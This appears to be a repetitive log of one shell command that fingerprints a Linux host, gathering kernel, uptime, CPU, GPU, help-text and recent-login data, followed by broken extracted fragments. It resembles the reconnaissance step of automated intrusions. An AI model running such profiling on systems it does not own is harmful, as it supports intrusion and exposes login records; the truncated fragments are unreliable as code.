cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
